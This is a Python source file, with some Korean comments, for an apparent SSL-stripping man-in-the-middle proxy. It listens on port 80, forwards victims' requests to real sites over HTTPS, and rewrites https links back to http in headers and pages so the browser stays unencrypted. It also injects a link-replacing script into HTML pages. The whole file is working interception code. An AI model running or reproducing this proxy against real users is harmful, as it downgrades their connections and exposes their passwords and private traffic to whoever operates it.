from network.endpoint import Client, Server
from network.packet import Packet
from utils.debug_save import debug_save
from utils.linkreplacer import linkreplacer

import threading
import socket
import ssl

default_context = ssl.create_default_context()

class Proxy:
    sock: socket.socket
    addr: tuple[str, int]
    host: str
    port: int
    def __init__(self, addr: tuple[str, int]) -> None:
        self.addr = addr
        self.host, self.port = addr
        self.sock = socket.create_server(addr)

    def accept(self) -> Client:
        return Client(self.sock.accept()[0])

    def connect_to(self, host: str) -> Server:
        try:
            return Server(default_context.wrap_socket(socket.create_connection((host, 443)), server_hostname=host))
        except ConnectionRefusedError:
            return Server(socket.create_connection((host, 80)))

    def spoof(self, client: Client) -> None:
        print(f"spoof: {client.sock.getsockname()}")
        with client:
            req = client.recv()
            host = req.header.get(b"Host").decode().split(":")[0]
            req.header_replace(b"http://", b"https://")

            server = self.connect_to(host)
            with server:
                server.send(req)
                res = server.recv()
                debug_save(res.body.plain_text, "ServerRecv")
            res.header_replace(b"https://", b"http://")
            content_type = res.header.get(b"Content-Type").split(b";")[0].strip()
            # if content_type in [b'text/html', b'application/javascript']: #이거 조건문 하면 안되나. 안될거같은걸? 그치?
            res.body_replace(b"https://", b"http://")
            if content_type in [b'text/html'] and is_dochtml(res.body.plain_text.lstrip()):
                res.body.plain_text = linkreplacer + res.body.plain_text
            debug_save(res.body.plain_text, "after_replace")
            client.send(res)

    def run(self) -> None:
        print("[START]")
        try:
            while 1:
                client = self.accept()
                thread = threading.Thread(target=self.spoof, args=(client,))
                thread.daemon = True
                thread.start()
                # self.spoof(client)
        except KeyboardInterrupt:
            print("[SHUTDOWN]")


# todo: bytes로 해뒀는데, 이거 body로 해야하고 packet 패키지 안으로 넣어야함
def is_dochtml(body: bytes) -> bool:
    # debug_save(body, "whatisthis")
    return body.lower().startswith(b"<!doctype")



def main():
    Proxy(("", 80)).run()

if __name__ == "__main__":
    main()